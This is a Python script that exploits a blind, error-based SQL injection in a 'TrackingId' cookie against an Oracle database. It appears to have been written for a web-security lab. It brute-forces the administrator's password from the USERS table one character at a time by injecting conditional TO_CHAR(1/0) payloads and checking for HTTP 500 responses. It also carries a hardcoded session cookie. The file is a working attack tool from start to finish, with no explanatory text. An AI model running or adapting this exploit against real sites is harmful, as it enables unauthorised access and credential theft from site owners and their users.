import requests
import sys
# import urllib3
import string
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())



url = sys.argv[1]
chars = sys.argv[2]

# chars = list(chars)
cookies = {"TrackingId": "r1NDiIKGbEZusqip "  ,
           "session":"4op5JTmIEtTi30tV8Lfc3bImd1KXA4iV"}


cookies["TrackingId"] =  "r1NDiIKGbEZusqip " + "'|| (select case when 1=1  then null ELSE TO_CHAR(1/0) END from USERS WHERE ROWNUM = 1 and username = 'administrator' and SUBSTR(password, 1, 1) = '_' )|| '"
r= requests.get(url, cookies=cookies)
if r.ok:
    print("(+) Secessfuly Make a Connectoin ... ")
else :
    print("(-) There is Problem with Your payload")
    sys.exit(1)

password = ""
for num in range (1, 21):
    for c in chars :
        
        cookies["TrackingId"] =  "r1NDiIKGbEZusqip " + "'|| (select case when 1=11  then null ELSE TO_CHAR(1/0) END from USERS WHERE ROWNUM = 1 and  username = 'administrator' and SUBSTR(password, %s, 1) = '%s' )|| '"% (num ,c)
        r = requests.get(url, cookies=cookies)
        
        if r.status_code == 500:
            password += c
            print(num , c)
            # chars.remove(chars[c])
            break
        



print ("(+) Secessfuly Get The Password" )
print(password , "\n\n")
 
        
        
        
           
